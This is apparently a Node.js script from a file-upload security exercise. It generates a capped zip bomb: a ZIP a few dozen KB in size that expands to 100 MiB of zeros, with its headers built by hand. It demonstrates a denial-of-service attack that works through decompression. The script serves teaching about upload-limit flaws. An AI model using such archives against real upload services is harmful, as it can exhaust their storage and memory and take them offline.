#!/usr/bin/env node
/**
 * Builds samples/bomb.zip for FileUpload exercise 5 (application-layer DoS).
 *
 * On the wire the archive is a few dozen KB. Uncompressed size is 100 MiB of
 * zeros — enough to show "MAX bytes on the wire is not MAX bytes after unzip"
 * without a classic 42.zip that would fill the machine.
 */
import { createDeflateRaw, crc32 } from "node:zlib";
import { writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { finished } from "node:stream/promises";

const UNCOMPRESSED = 100 * 1024 * 1024; // 100 MiB
const CHUNK = 1024 * 1024;
const zeros = Buffer.alloc(CHUNK, 0);
const deflator = createDeflateRaw({ level: 9 });
const parts = [];
deflator.on("data", (chunk) => {
  parts.push(chunk);
});

let crc = 0;
for (let offset = 0; offset < UNCOMPRESSED; offset += CHUNK) {
  crc = crc32(zeros, crc);
  const ready = deflator.write(zeros);
  if (!ready) {
    await new Promise((resolve) => deflator.once("drain", resolve));
  }
}
deflator.end();
await finished(deflator);

const compressed = Buffer.concat(parts);
const name = Buffer.from("zeros.bin");

function u16(n) {
  const b = Buffer.alloc(2);
  b.writeUInt16LE(n);
  return b;
}
function u32(n) {
  const b = Buffer.alloc(4);
  b.writeUInt32LE(n);
  return b;
}

const local = Buffer.concat([
  Buffer.from([0x50, 0x4b, 0x03, 0x04]),
  u16(20),
  u16(0),
  u16(8),
  u16(0),
  u16(0),
  u32(crc),
  u32(compressed.length),
  u32(UNCOMPRESSED),
  u16(name.length),
  u16(0),
  name,
  compressed,
]);

const central = Buffer.concat([
  Buffer.from([0x50, 0x4b, 0x01, 0x02]),
  u16(20),
  u16(20),
  u16(0),
  u16(8),
  u16(0),
  u16(0),
  u32(crc),
  u32(compressed.length),
  u32(UNCOMPRESSED),
  u16(name.length),
  u16(0),
  u16(0),
  u16(0),
  u16(0),
  u32(0),
  u32(0),
  name,
]);

const eocd = Buffer.concat([
  Buffer.from([0x50, 0x4b, 0x05, 0x06]),
  u16(0),
  u16(0),
  u16(1),
  u16(1),
  u32(central.length),
  u32(local.length),
  u16(0),
]);

const out = join(dirname(fileURLToPath(import.meta.url)), "bomb.zip");
writeFileSync(out, Buffer.concat([local, central, eocd]));
console.log(
  `Wrote ${out} (${compressed.length} compressed bytes → ${UNCOMPRESSED} uncompressed)`,
);
